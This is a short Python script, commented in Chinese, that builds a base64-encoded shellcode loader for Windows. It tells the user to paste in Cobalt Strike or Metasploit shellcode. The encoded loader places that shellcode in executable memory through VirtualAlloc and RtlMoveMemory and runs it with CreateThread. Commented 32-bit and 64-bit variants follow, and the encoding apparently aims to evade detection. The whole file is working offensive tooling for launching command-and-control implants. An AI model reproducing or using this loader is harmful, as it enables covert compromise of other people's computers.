import base64,ctypes

# 编码后输出的cd就是发送端发送的shellcode
# 编码后输出的jz值就是执行上线端的zx
# 无论是shellcode编码还是加载器编码，输出取的值都是b''中单引号之间的值

# shellcode编码
# 请把cs或者msf生成的playload.c文件里的shellcode复制到b''的单引号之间
cd=b''
cd=base64.b64encode(cd)
print(cd)


#加载器编码
jz=b'''sc=base64.b64decode(cd)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(sc), len(sc))
handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
jz=base64.b64encode(jz)'''
jz=base64.b64encode(jz)
print(jz)

# # 64位
# sc=b''
# ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64
# shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(sc), len(sc))
# handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
# ctypes.windll.kernel32.WaitForSingleObject(handle, -1)


# # 32位
# sc=b''
# shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x1000, 0x40)
# ctypes.windll.kernel32.RtlMoveMemory(shangxian, ctypes.create_string_buffer(sc), len(sc))
# handle = ctypes.windll.kernel32.CreateThread(0, 0, shangxian, 0, 0, 0)
# ctypes.windll.kernel32.WaitForSingleObject(handle, -1)
